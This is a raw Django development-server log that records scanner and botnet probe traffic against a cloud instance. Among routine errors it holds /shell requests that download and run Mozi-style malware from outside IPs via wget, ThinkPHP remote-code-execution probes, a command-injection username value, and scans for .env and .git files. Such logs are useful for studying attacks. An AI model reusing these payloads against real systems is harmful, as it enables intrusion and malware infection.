Watching for file changes with StatReloader
[08/Aug/2020 15:19:26] "GET / HTTP/1.1" 200 1833
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[23/Aug/2020 18:36:31] "GET / HTTP/1.0" 400 59585
[23/Aug/2020 18:36:34] code 400, message Bad request version ('À\x14À')
[23/Aug/2020 18:36:34] You're accessing the development server over HTTPS, but it only supports HTTP.

[23/Aug/2020 18:40:59] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[23/Aug/2020 19:37:39] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
Not Found: /boaform/admin/formLogin
[23/Aug/2020 20:00:40] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[23/Aug/2020 20:11:54] "GET / HTTP/1.1" 200 5033
Not Found: /config/getuser
[23/Aug/2020 20:39:05] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
Not Found: /solr/admin/info/system
[23/Aug/2020 21:22:29] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[23/Aug/2020 21:36:35] "GET / HTTP/1.0" 400 60035
[23/Aug/2020 21:36:48] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[23/Aug/2020 21:52:34] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[23/Aug/2020 21:57:48] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[23/Aug/2020 22:12:57] "GET / HTTP/1.0" 400 60118
----------------------------------------
Exception happened during processing of request from ('162.142.125.40', 52420)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[23/Aug/2020 22:16:13] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('162.142.125.40', 58950)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[23/Aug/2020 22:16:13] "GET / HTTP/1.1" 200 5033
[23/Aug/2020 23:13:15] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[24/Aug/2020 00:38:14] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[24/Aug/2020 01:07:20] "GET / HTTP/1.1" 200 5033
Not Found: /api/jsonws/invoke
[24/Aug/2020 01:25:07] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
Not Found: /config/getuser
[24/Aug/2020 02:20:59] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
Not Found: /shell
[24/Aug/2020 02:34:00] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://115.55.135.108:55881/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 2689
----------------------------------------
Exception happened during processing of request from ('115.55.135.108', 56318)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Not Found: /portal/redlion
[24/Aug/2020 03:33:58] "GET /portal/redlion HTTP/1.1" 404 2622
Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /shell
[24/Aug/2020 04:19:58] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.172.111.214/bins/UnHAnaAW.x86;chmod+777+/tmp/UnHAnaAW.x86;sh+/tmp/UnHAnaAW.x86+w00dy.jaws HTTP/1.1" 400 61226
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[24/Aug/2020 05:52:12] "GET / HTTP/1.0" 400 59959
[24/Aug/2020 06:10:54] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[24/Aug/2020 06:37:24] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[24/Aug/2020 08:17:55] "GET / HTTP/1.1" 200 5033
[24/Aug/2020 08:52:28] "GET / HTTP/1.1" 200 5033
[24/Aug/2020 10:19:55] "GET / HTTP/1.1" 200 5033
[24/Aug/2020 10:24:10] "GET / HTTP/1.1" 200 5033
[24/Aug/2020 10:36:15] "GET / HTTP/1.1" 200 5033
[24/Aug/2020 11:22:56] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('68.184.243.89', 52170)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Not Found: /boaform/admin/formLogin
[24/Aug/2020 11:24:24] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
Not Found: /solr/admin/info/system
[24/Aug/2020 11:42:48] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[24/Aug/2020 11:49:09] code 400, message Bad request version ('V¿\x99Ç')
[24/Aug/2020 11:49:09] "»©Ú@õÕÆóm²ÎD¿µö¼¤åbÏÇ®öw¨ÁssOG¹V¿Ç" 400 -
[24/Aug/2020 11:58:29] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[24/Aug/2020 12:16:27] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[24/Aug/2020 12:23:30] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
[24/Aug/2020 12:35:20] "GET / HTTP/1.1" 200 5033
Not Found: /hudson
[24/Aug/2020 13:30:22] "GET /hudson HTTP/1.1" 404 2598
Not Found: /TP/public/index.php
[24/Aug/2020 14:06:58] "GET /TP/public/index.php HTTP/1.1" 404 2637
Not Found: /TP/index.php
[24/Aug/2020 14:07:00] "GET /TP/index.php HTTP/1.1" 404 2616
Not Found: /thinkphp/html/public/index.php
[24/Aug/2020 14:07:00] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2670
Not Found: /html/public/index.php
[24/Aug/2020 14:07:01] "GET /html/public/index.php HTTP/1.1" 404 2643
Not Found: /public/index.php
[24/Aug/2020 14:07:02] "GET /public/index.php HTTP/1.1" 404 2628
Not Found: /TP/html/public/index.php
[24/Aug/2020 14:07:03] "GET /TP/html/public/index.php HTTP/1.1" 404 2652
Not Found: /elrekt.php
[24/Aug/2020 14:07:03] "GET /elrekt.php HTTP/1.1" 404 2610
Not Found: /index.php
[24/Aug/2020 14:07:04] "GET /index.php HTTP/1.1" 404 2607
[24/Aug/2020 14:07:05] "GET / HTTP/1.1" 200 5033
[24/Aug/2020 15:08:35] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[24/Aug/2020 15:14:58] "GET / HTTP/1.0" 400 59583
Invalid HTTP_HOST header: '0'. You may need to add '0' to ALLOWED_HOSTS.
Bad Request: /
[24/Aug/2020 15:15:04] "GET / HTTP/1.1" 400 58963
Not Found: /etc/
[24/Aug/2020 15:25:42] "GET /etc/ HTTP/1.1" 404 2592
Not Found: /api/jsonws/invoke
[24/Aug/2020 16:18:02] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[24/Aug/2020 16:19:20] "GET / HTTP/1.0" 400 59958
Not Found: /boaform/admin/formLogin
[24/Aug/2020 16:24:52] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[24/Aug/2020 16:32:45] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[24/Aug/2020 17:20:12] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[24/Aug/2020 18:03:10] "GET / HTTP/1.1" 200 5033
[24/Aug/2020 18:40:22] "GET / HTTP/1.1" 200 5033
[24/Aug/2020 18:56:26] "GET / HTTP/1.1" 200 5033
Not Found: /statusz
[24/Aug/2020 20:51:01] "GET /statusz HTTP/1.1" 404 2604
Not Found: /config/getuser
[24/Aug/2020 21:32:54] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
[24/Aug/2020 22:09:48] "GET / HTTP/1.1" 200 5033
Not Found: /Telerik.Web.UI.WebResource.axd
[24/Aug/2020 22:09:54] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 2679
Not Found: /TP/public/index.php
[24/Aug/2020 22:28:26] "GET /TP/public/index.php HTTP/1.1" 404 2637
Not Found: /.git/config
[24/Aug/2020 22:55:16] "GET /.git/config HTTP/1.1" 404 2616
Not Found: /.env
Not Found: /v2/_catalog
[24/Aug/2020 22:55:16] "GET /v2/_catalog HTTP/1.1" 404 2616
[24/Aug/2020 22:55:16] "GET /.env HTTP/1.1" 404 2595
[24/Aug/2020 22:55:16] "GET / HTTP/1.1" 200 5033
[25/Aug/2020 00:29:00] "GET / HTTP/1.1" 200 5033
[25/Aug/2020 01:34:29] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[25/Aug/2020 02:27:53] "GET / HTTP/1.0" 400 59957
Not Found: /config/getuser
[25/Aug/2020 03:02:50] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
Not Found: /solr/admin/info/system
[25/Aug/2020 03:06:02] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[25/Aug/2020 03:20:56] "GET / HTTP/1.0" 400 60035
[25/Aug/2020 03:27:09] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
Not Found: /portal/redlion
[25/Aug/2020 03:37:47] "GET /portal/redlion HTTP/1.1" 404 2622
[25/Aug/2020 03:51:38] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
[25/Aug/2020 04:00:38] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('130.0.191.218', 43604)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Not Found: /index.php
[25/Aug/2020 04:05:08] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
Not Found: /boaform/admin/formLogin
[25/Aug/2020 04:17:44] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[25/Aug/2020 04:57:41] "GET / HTTP/1.0" 400 60107
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[25/Aug/2020 05:01:26] "GET / HTTP/1.0" 400 60118
----------------------------------------
Exception happened during processing of request from ('192.35.168.251', 43416)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[25/Aug/2020 05:13:48] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('192.35.168.251', 57844)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[25/Aug/2020 05:13:48] "GET / HTTP/1.1" 200 5033
[25/Aug/2020 05:28:17] "GET / HTTP/1.1" 200 5033
[25/Aug/2020 08:09:57] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[25/Aug/2020 08:14:46] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
Not Found: /api/jsonws/invoke
[25/Aug/2020 09:04:13] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
[25/Aug/2020 09:05:03] "GET / HTTP/1.1" 200 5033
[25/Aug/2020 10:42:48] "GET / HTTP/1.1" 200 5033
Not Found: /config/getuser
[25/Aug/2020 10:53:19] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /adv,/cgi-bin/weblogin.cgi
[25/Aug/2020 10:53:40] "GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bls%20%23&password=asdf HTTP/1.1" 400 60563
Not Found: /ReportServer
[25/Aug/2020 12:41:15] "GET /ReportServer HTTP/1.1" 404 2616
[25/Aug/2020 13:11:55] "GET / HTTP/1.1" 200 5033
Not Found: /000000000000.cfg
[25/Aug/2020 13:40:55] "GET /000000000000.cfg HTTP/1.1" 404 2628
Not Found: /mahmah.cfg
[25/Aug/2020 13:40:55] "GET /mahmah.cfg HTTP/1.1" 404 2610
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[25/Aug/2020 14:40:57] "GET / HTTP/1.0" 400 59585
[25/Aug/2020 14:40:58] code 400, message Bad request version ('À\x14À')
[25/Aug/2020 14:40:58] You're accessing the development server over HTTPS, but it only supports HTTP.

[25/Aug/2020 14:57:34] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('60.194.6.9', 44438)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[25/Aug/2020 15:10:57] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'api.ipify.org'. You may need to add 'api.ipify.org' to ALLOWED_HOSTS.
Bad Request: /http:/api.ipify.org/
[25/Aug/2020 15:26:44] "GET http://api.ipify.org/ HTTP/1.1" 400 59676
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[25/Aug/2020 15:50:34] "GET / HTTP/1.0" 400 59710
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /adv,/cgi-bin/weblogin.cgi
[25/Aug/2020 16:41:16] "GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bls%20%23&password=asdf HTTP/1.1" 400 60565
[25/Aug/2020 16:42:00] "GET / HTTP/1.1" 200 5033
Not Found: /favicon.ico
[25/Aug/2020 16:42:00] "GET /favicon.ico HTTP/1.1" 404 2613
[25/Aug/2020 16:42:02] "GET / HTTP/1.1" 200 5033
Traceback (most recent call last):
  File "/usr/lib/python3.8/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib/python3.8/wsgiref/handlers.py", line 184, in finish_response
    self.write(data)
  File "/usr/lib/python3.8/wsgiref/handlers.py", line 293, in write
    self._write(data)
  File "/usr/lib/python3.8/wsgiref/handlers.py", line 467, in _write
    result = self.stdout.write(data)
  File "/usr/lib/python3.8/socketserver.py", line 799, in write
    self._sock.sendall(b)
TimeoutError: [Errno 110] Connection timed out
Not Found: /solr/admin/info/system
[25/Aug/2020 17:34:24] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
Not Found: /manager/html
[25/Aug/2020 17:49:47] "GET /manager/html HTTP/1.1" 404 2619
[25/Aug/2020 17:57:27] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[25/Aug/2020 18:23:34] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[25/Aug/2020 18:36:53] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
[25/Aug/2020 18:44:18] "GET / HTTP/1.1" 200 5033
[25/Aug/2020 19:10:11] "GET / HTTP/1.1" 200 5033
[25/Aug/2020 19:52:48] "GET / HTTP/1.1" 200 5033
[25/Aug/2020 20:21:13] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /adv,/cgi-bin/weblogin.cgi
[25/Aug/2020 21:06:50] "GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bls%20%23&password=asdf HTTP/1.1" 400 60566
[25/Aug/2020 21:27:14] "GET / HTTP/1.1" 200 5033
[25/Aug/2020 21:33:48] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[25/Aug/2020 22:05:48] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
Not Found: /config/getuser
[25/Aug/2020 22:51:06] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[25/Aug/2020 23:41:53] "GET / HTTP/1.0" 400 59583
Invalid HTTP_HOST header: '0'. You may need to add '0' to ALLOWED_HOSTS.
Bad Request: /
[25/Aug/2020 23:41:59] "GET / HTTP/1.1" 400 58963
Invalid HTTP_HOST header: '163.172.88.110:41298'. You may need to add '163.172.88.110' to ALLOWED_HOSTS.
Bad Request: /http:/163.172.88.110:41298/1
[25/Aug/2020 23:53:20] "GET http://163.172.88.110:41298/1 HTTP/1.1" 400 59847
Invalid HTTP_HOST header: '163.172.88.110:41298'. You may need to add '163.172.88.110' to ALLOWED_HOSTS.
Bad Request: /http:/163.172.88.110:41298/1
[25/Aug/2020 23:53:20] "GET http://163.172.88.110:41298/1 HTTP/1.1" 400 59847
Invalid HTTP_HOST header: '163.172.88.110:41298'. You may need to add '163.172.88.110' to ALLOWED_HOSTS.
Bad Request: /http:/163.172.88.110:41298/1
[25/Aug/2020 23:53:22] "GET http://163.172.88.110:41298/1 HTTP/1.1" 400 59847
[26/Aug/2020 01:12:14] "GET / HTTP/1.1" 200 5033
[26/Aug/2020 02:17:08] "GET / HTTP/1.1" 200 5033
[26/Aug/2020 02:23:32] "GET / HTTP/1.0" 200 5033
Not Found: /solr/admin/info/system
[26/Aug/2020 03:30:01] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[26/Aug/2020 03:42:18] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[26/Aug/2020 03:55:56] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[26/Aug/2020 04:01:18] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
[26/Aug/2020 04:13:07] "GET / HTTP/1.1" 200 5033
Not Found: /manager/html
[26/Aug/2020 04:30:16] "GET /manager/html HTTP/1.1" 404 2616
Not Found: /phpmyadmin/
[26/Aug/2020 04:33:03] "GET /phpmyadmin/ HTTP/1.1" 404 2613
----------------------------------------
Exception happened during processing of request from ('123.174.114.4', 10355)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[26/Aug/2020 04:43:31] "GET / HTTP/1.0" 400 60079
[26/Aug/2020 05:02:12] "GET / HTTP/1.1" 200 5033
Not Found: /config/getuser
[26/Aug/2020 05:41:17] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[26/Aug/2020 05:46:14] "GET / HTTP/1.0" 400 60036
[26/Aug/2020 06:01:52] "GET / HTTP/1.1" 200 5033
Not Found: /.env
[26/Aug/2020 06:12:00] "GET /.env HTTP/1.1" 404 2592
Forbidden (CSRF cookie not set.): /
[26/Aug/2020 06:12:00] "POST / HTTP/1.1" 403 2864
[26/Aug/2020 06:20:44] "GET / HTTP/1.1" 200 5033
Not Found: /api/jsonws/invoke
[26/Aug/2020 06:58:10] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
[26/Aug/2020 08:01:51] code 400, message Bad request version ('<\x90Ýªmæ\x7fÄ¼T\x00\x00\x18À\x14À\x13\x005\x00/À')
[26/Aug/2020 08:01:51] You're accessing the development server over HTTPS, but it only supports HTTP.

[26/Aug/2020 08:01:51] code 400, message Bad request syntax ('\x16\x03\x01\x00^\x01\x00\x00Z\x03\x01_F\x16ïÚcBÈ\x88É\x03\x9f\x11è\x04\x8c\x0e·ïFM,\x88Çïpùfð\x91\x05\x13\x00\x00\x18À\x14À\x13\x005\x00/À')
[26/Aug/2020 08:01:51] You're accessing the development server over HTTPS, but it only supports HTTP.

[26/Aug/2020 09:14:53] "GET / HTTP/1.1" 200 5033
Not Found: /TP/public/index.php
[26/Aug/2020 09:45:29] "GET /TP/public/index.php HTTP/1.1" 404 2637
Not Found: /TP/index.php
